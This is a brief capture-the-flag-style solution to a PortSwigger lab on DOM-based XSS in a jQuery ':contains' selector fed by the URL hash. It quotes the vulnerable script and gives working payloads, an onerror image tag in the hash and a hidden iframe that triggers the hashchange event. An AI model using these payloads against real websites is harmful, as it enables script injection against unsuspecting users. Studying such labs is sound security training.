# Lab: DOM XSS in jQuery selector sink using a hashchange event
# https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event

```bash
# View Page Source

 <script>  $(window).on('hashchange', function(){   var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
if (post) post.get(0).scrollIntoView(); });</script>

# What this basicly does is it takes the value after # and scrolls to the post that has that value as it's name whenever we change the value.

# This was the url and there is post called Smart Recognition

https://0a6a0021033b86c48a9535bc00c80097.web-security-academy.net/

# if we change the url to this it will scroll to Smart Recognition
https://0a6a0021033b86c48a9535bc00c80097.web-security-academy.net/#Smart Recognition

# But when you enter again without changing this new url it will not scroll to Smart Recognition because of the hashchange
```

```bash
https://0a6a0021033b86c48a9535bc00c80097.web-security-academy.net/#<img src=0 onerror=print()>

# when you do it for the first time you will get result but because of hashchange when you enter again it won't work.
# So when we send this link to our victim it won't be enough because when they click they won't trigger hashchange event.
```
```bash
# click to exploit server and type this into body

<iframe src="https://0a6a0021033b86c48a9535bc00c80097.web-security-academy.net/#" onload="this.src += '<img src=1 onerror=print()>' " hidden="hidden">
</iframe>

# What this basicly does is first it loads https://0a6a0021033b86c48a9535bc00c80097.web-security-academy.net/#

# After that src attribute becomes https://0a6a0021033b86c48a9535bc00c80097.web-security-academy.net/#<img src=1 onerror=print()>

# By that we are triggering hashchange and we completed.
```
